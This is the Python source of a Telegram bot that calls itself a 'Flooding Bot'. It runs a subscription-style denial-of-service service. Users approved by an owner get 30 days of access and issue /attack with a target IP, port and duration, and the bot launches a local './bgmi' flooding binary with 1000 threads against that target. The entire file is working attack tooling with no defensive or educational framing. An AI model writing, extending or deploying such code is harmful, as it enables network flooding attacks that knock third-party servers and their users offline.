import subprocess
import json
import datetime
import asyncio
from telegram import Update, User
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes
from config import BOT_TOKEN, ADMIN_IDS, OWNER_USERNAME

USER_FILE = "users.json"
DEFAULT_THREADS = 1000
DEFAULT_PACKET = 9

users = {}
user_processes = {}  # Dictionary to track processes for each user
OWNER_ID = None  # Will hold the owner ID for managing approvals/disapprovals


def load_users():
    try:
        with open(USER_FILE, "r") as file:
            return json.load(file)
    except FileNotFoundError:
        return {}
    except Exception as e:
        print(f"Error loading users: {e}")
        return {}


def save_users():
    with open(USER_FILE, "w") as file:
        json.dump(users, file)


async def set_owner(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global OWNER_ID
    user_id = str(update.message.from_user.id)

    # Only allow users in ADMIN_IDS to set the owner
    if user_id in ADMIN_IDS:
        if OWNER_ID is not None:
            await update.message.reply_text("The owner has already been set. Only one owner is allowed.")
            return
        
        if len(context.args) != 1:
            await update.message.reply_text("Usage: /setowner <user_id>")
            return

        OWNER_ID = context.args[0]
        await update.message.reply_text(f"Owner has been set to {OWNER_ID}. Now only this user can approve/disapprove users.")
    else:
        await update.message.reply_text("Only bot owners can set the owner.")


async def approve_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if OWNER_ID is None:
        await update.message.reply_text("The bot owner is not set yet. Please set the owner first using /setowner <user_id>.")
        return

    # Check if the user is the owner
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the bot owner can approve users.")
        return

    # Check if the command is used in reply to another user's message
    if update.message.reply_to_message:
        target_user: User = update.message.reply_to_message.from_user
        target_user_id = str(target_user.id)
    elif len(context.args) == 1:  # Check if a user ID is provided as an argument
        target_user_id = context.args[0]
    else:
        await update.message.reply_text("Usage: Reply to a user's message or provide their user ID: /approve <user_id>")
        return

    users[target_user_id] = str(datetime.datetime.now() + datetime.timedelta(days=30))  # Set 30 days expiration
    save_users()
    await update.message.reply_text(f"User {target_user_id} has been approved. Total approved users: {len(users)}")


async def disapprove_user(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)

    if OWNER_ID is None:
        await update.message.reply_text("The bot owner is not set yet. Please set the owner first using /setowner <user_id>.")
        return

    # Check if the user is the owner
    if user_id != OWNER_ID:
        await update.message.reply_text("Only the bot owner can disapprove users.")
        return

    # Check if the command is used in reply to another user's message
    if update.message.reply_to_message:
        target_user: User = update.message.reply_to_message.from_user
        target_user_id = str(target_user.id)
    elif len(context.args) == 1:  # Check if a user ID is provided as an argument
        target_user_id = context.args[0]
    else:
        await update.message.reply_text("Usage: Reply to a user's message or provide their user ID: /disapprove <user_id>")
        return

    if target_user_id in users:
        del users[target_user_id]
        save_users()
        await update.message.reply_text(f"User {target_user_id} has been disapproved. Total approved users: {len(users)}")
    else:
        await update.message.reply_text("User not found in the approved list.")


async def attack(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    global user_processes
    user_id = str(update.message.from_user.id)

    # Check if the user is approved
    if user_id not in users:
        await update.message.reply_text("You are not authorized to use this command.")
        return

    if len(context.args) != 4:
        await update.message.reply_text('Usage: /attack <target_ip> <port> <duration> <sid>')
        return

    target_ip = context.args[0]
    port = context.args[1]
    duration = int(context.args[2])  # Convert duration to an integer (seconds)
    packet = context.args[3]

    if user_id in user_processes and user_processes[user_id].poll() is None:
        await update.message.reply_text("\u26a0\ufe0f An attack is already running. Please wait for it to finish.")
        return

    flooding_command = ['./bgmi', target_ip, port, str(duration), str(DEFAULT_PACKET), str(DEFAULT_THREADS)]

    # Start the flooding process for the user
    process = subprocess.Popen(flooding_command)
    user_processes[user_id] = process

    await update.message.reply_text(f'Flooding started: {target_ip}:{port} for {duration} seconds with {DEFAULT_THREADS} threads.')

    # Wait for the specified duration asynchronously
    await asyncio.sleep(duration)

    # Terminate the flooding process after the duration
    process.terminate()
    del user_processes[user_id]

    await update.message.reply_text(f'Flooding attack finished: {target_ip}:{port}. Attack ran for {duration} seconds.')


async def allusers(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = str(update.message.from_user.id)
    if user_id in ADMIN_IDS:
        if users:
            response = f"Authorized Users ({len(users)} total):\n"
            for user_id, expiration_date in users.items():
                try:
                    user_info = await context.bot.get_chat(int(user_id))
                    username = user_info.username if user_info.username else f"UserID: {user_id}"
                    response += f"- @{username} (ID: {user_id})\n"
                except Exception:
                    response += f"- User ID: {user_id}\n"
        else:
            response = "No authorized users found."
    else:
        response = "ONLY OWNER CAN USE."
    await update.message.reply_text(response)


async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    response = (
        f"Welcome to the Flooding Bot by @{OWNER_USERNAME}! Here are the available commands:\n\n"
        "Admin Commands:\n"
        "/setowner <user_id> - Set the bot owner (only for admin users, one owner only).\n"
        "/approve - Approve a user (reply to a user or provide their ID).\n"
        "/disapprove - Disapprove a user (reply to a user or provide their user ID).\n"
        "/allusers - Show all authorized users.\n\n"
        "User Commands:\n"
        "/attack <target_ip> <port> <duration> <sid> - Start a flooding attack.\n"
    )
    await update.message.reply_text(response)


def main() -> None:
    application = ApplicationBuilder().token(BOT_TOKEN).build()

    application.add_handler(CommandHandler("setowner", set_owner))
    application.add_handler(CommandHandler("approve", approve_user))
    application.add_handler(CommandHandler("disapprove", disapprove_user))
    application.add_handler(CommandHandler("attack", attack))
    application.add_handler(CommandHandler("allusers", allusers))
    application.add_handler(CommandHandler("help", help_command))

    global users
    users = load_users()
    application.run_polling()


if __name__ == '__main__':
    main()
